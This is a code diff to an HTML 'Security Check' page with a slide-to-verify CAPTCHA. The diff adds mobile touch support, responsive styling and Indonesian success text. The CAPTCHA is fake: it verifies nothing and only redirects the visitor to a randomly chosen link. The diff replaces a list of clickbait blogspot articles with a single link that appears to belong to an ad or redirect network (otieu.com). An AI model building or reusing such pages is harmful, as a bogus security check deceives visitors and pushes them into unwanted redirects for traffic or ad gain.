@@ -2,27 +2,34 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
   <title>Slide to Verify</title>
   <style>
+    * {
+      box-sizing: border-box;
+    }
+
     body {
       font-family: sans-serif;
       text-align: center;
-      padding: 80px 20px;
+      padding: 60px 20px;
       background: #f9f9f9;
     }
 
     h2 {
-      margin-top: 60px;
+      margin-bottom: 40px;
       color: #333;
+      font-size: 1.2rem;
     }
 
     #sliderBox {
       position: relative;
-      width: 300px;
-      height: 44px;
+      width: 100%;
+      max-width: 360px;
+      height: 48px;
       background: #e0e0e0;
       border-radius: 30px;
-      margin: 40px auto;
+      margin: 0 auto;
       overflow: hidden;
       box-shadow: inset 0 0 5px #ccc;
     }
@@ -32,7 +39,7 @@
       left: 0;
       top: 0;
       height: 100%;
-      width: 0;
+      width: 0%;
       background-color: #00c853;
       border-radius: 30px 0 0 30px;
       transition: width 0.1s;
@@ -40,8 +47,8 @@
     }
 
     #sliderButton {
-      width: 44px;
-      height: 44px;
+      width: 48px;
+      height: 48px;
       background: #00aaff;
       border-radius: 50%;
       position: absolute;
@@ -50,6 +57,7 @@
       z-index: 1;
       cursor: pointer;
       transition: background 0.2s;
+      touch-action: none;
     }
 
     #sliderText {
@@ -59,12 +67,39 @@
       top: 0;
       bottom: 0;
       text-align: center;
-      line-height: 44px;
+      line-height: 48px;
       color: #555;
-      font-size: 14px;
+      font-size: 0.95rem;
       user-select: none;
       pointer-events: none;
       z-index: 2;
+    }
+
+    @media (max-width: 480px) {
+      h2 {
+        font-size: 1rem;
+      }
+
+      #sliderText {
+        font-size: 0.85rem;
+      }
+
+      #sliderBox, #sliderButton {
+        height: 44px;
+      }
+
+      #sliderButton {
+        width: 44px;
+        height: 44px;
+      }
+
+      #sliderBox {
+        max-width: 300px;
+      }
+
+      #sliderText {
+        line-height: 44px;
+      }
     }
   </style>
 </head>
@@ -72,11 +107,10 @@
 <h1>Security Check</h1>
 <p>Please complete the CAPTCHA below to proceed.</p>
 <p>This step helps protect our platform from malicious bots.</p>
-  <h2>Slide to Verify</h2>
 
   <div id="sliderBox">
     <div id="progressBar"></div>
-    <div id="sliderText">Slide to verify</div>
+    <div id="sliderText">Slide to Verify</div>
     <div id="sliderButton"></div>
   </div>
 
@@ -88,54 +122,59 @@
 
     let isDragging = false;
     let startX;
-    let maxSlide = box.offsetWidth - button.offsetWidth;
     let verified = false;
 
-    button.addEventListener("mousedown", function(e) {
+    function getMaxSlide() {
+      return box.offsetWidth - button.offsetWidth;
+    }
+
+    function onDragStart(e) {
       if (verified) return;
       isDragging = true;
-      startX = e.clientX;
-    });
+      startX = e.clientX || e.touches[0].clientX;
+    }
 
-    document.addEventListener("mousemove", function(e) {
+    function onDragMove(e) {
       if (!isDragging || verified) return;
-      let moveX = e.clientX - startX;
+      const currentX = e.clientX || e.touches[0].clientX;
+      let moveX = currentX - startX;
+      const maxSlide = getMaxSlide();
       moveX = Math.max(0, Math.min(moveX, maxSlide));
       button.style.left = moveX + "px";
-      progress.style.width = moveX + button.offsetWidth / 2 + "px";
-    });
+      progress.style.width = (moveX + button.offsetWidth / 2) + "px";
+    }
 
-    document.addEventListener("mouseup", function() {
+    function onDragEnd() {
       if (!isDragging || verified) return;
       isDragging = false;
-      let currentLeft = parseInt(button.style.left, 10);
+      const currentLeft = parseInt(button.style.left, 10);
+      const maxSlide = getMaxSlide();
       if (currentLeft >= maxSlide) {
         verified = true;
         button.style.left = maxSlide + "px";
         progress.style.width = "100%";
-        text.innerText = "Verified!";
+        text.innerText = "Terverifikasi!";
         redirectNow();
       } else {
         button.style.left = "0px";
         progress.style.width = "0px";
       }
-    });
+    }
+
+    // Events untuk mouse dan touch (mobile)
+    button.addEventListener("mousedown", onDragStart);
+    button.addEventListener("touchstart", onDragStart);
+
+    document.addEventListener("mousemove", onDragMove);
+    document.addEventListener("touchmove", onDragMove);
+
+    document.addEventListener("mouseup", onDragEnd);
+    document.addEventListener("touchend", onDragEnd);
 
     function redirectNow() {
       const links = [
-        "https://dodolbodolan.blogspot.com/2025/07/why-creative-design-matters-more-than.html",
-        "https://dodolbodolan.blogspot.com/2025/07/fuel-switches-under-scrutiny-in-air.html",
-        "https://dodolbodolan.blogspot.com/2025/07/strange-eggs-unraveling-double-yolks.html",
-        "https://dodolbodolan.blogspot.com/2025/07/netflix-breaks-silence-fan-favorite.html",
-        "https://dodolbodolan.blogspot.com/2025/07/nyt-mini-crossword-friday-july-18.html",
-        "https://dodolbodolan.blogspot.com/2025/07/andy-byron-kristin-cabot-meme-sensation.html",
-        "https://dodolbodolan.blogspot.com/2025/07/wheelchair-enabled-combat-in-cyberpunk.html",
-        "https://dodolbodolan.blogspot.com/2025/07/a-tiny-tale-unveils-whimsical-robot.html",
-        "https://dodolbodolan.blogspot.com/2025/07/black-cat-rebels-against-child-free.html",
-        "https://dodolbodolan.blogspot.com/2025/07/nyt-strands-hints-answers-july-18-2025.html",
-        "https://dodolbodolan.blogspot.com/2025/07/moms-clever-way-to-use-chatgpt-for-her.html"
+        "https://otieu.com/4/9463851"
       ];
-
       const index = Math.floor(Math.random() * links.length);
       window.location.href = links[index];
     }
